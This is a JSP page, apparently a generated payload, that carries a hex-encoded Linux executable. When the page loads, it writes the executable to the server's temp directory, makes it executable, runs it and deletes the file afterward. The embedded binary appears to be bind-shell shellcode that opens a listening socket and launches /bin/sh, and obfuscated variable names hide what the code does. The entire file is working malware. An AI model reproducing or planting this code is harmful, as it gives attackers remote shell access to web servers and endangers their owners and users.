<%@ page import="java.io.*" %>
<%
  String lxRbGgJLRjPNT = "7f454c4601010100000000000000000002000300010000005480040834000000000000000000000034002000010000000000000001000000000000000080040800800408a2000000f0000000070000000010000031dbf7e35343536a0289e1b066cd805b5e5268020020fb6a10515089e16a6658cd80894104b304b066cd8043b066cd8093596a3f58cd804979f8682f2f7368682f62696e89e3505389e1b00bcd80";
  String gKVkFjZsanTFLmr = System.getProperty("java.io.tmpdir") + "/rbmfXNympgloUGK";

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
    gKVkFjZsanTFLmr = gKVkFjZsanTFLmr.concat(".exe");
  }

  int qewLiNSiFChkLPK = lxRbGgJLRjPNT.length();
  byte[] djszWnFfenglt = new byte[qewLiNSiFChkLPK/2];
  for (int qgxngabyhcRjKE = 0; qgxngabyhcRjKE < qewLiNSiFChkLPK; qgxngabyhcRjKE += 2) {
    djszWnFfenglt[qgxngabyhcRjKE / 2] = (byte) ((Character.digit(lxRbGgJLRjPNT.charAt(qgxngabyhcRjKE), 16) << 4)
                                              + Character.digit(lxRbGgJLRjPNT.charAt(qgxngabyhcRjKE+1), 16));
  }

  FileOutputStream cpIaZbnCecw = new FileOutputStream(gKVkFjZsanTFLmr);
  cpIaZbnCecw.write(djszWnFfenglt);
  cpIaZbnCecw.flush();
  cpIaZbnCecw.close();

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1){
    String[] DCfgyzwKcgIpnx = new String[3];
    DCfgyzwKcgIpnx[0] = "chmod";
    DCfgyzwKcgIpnx[1] = "+x";
    DCfgyzwKcgIpnx[2] = gKVkFjZsanTFLmr;
    Process cualGbxWpxKV = Runtime.getRuntime().exec(DCfgyzwKcgIpnx);
    if (cualGbxWpxKV.waitFor() == 0) {
      cualGbxWpxKV = Runtime.getRuntime().exec(gKVkFjZsanTFLmr);
    }

    File zfgFlTezOsTo = new File(gKVkFjZsanTFLmr); zfgFlTezOsTo.delete();
  } else {
    String[] LcbNVvueq = new String[1];
    LcbNVvueq[0] = gKVkFjZsanTFLmr;
    Process cualGbxWpxKV = Runtime.getRuntime().exec(LcbNVvueq);
  }
%>
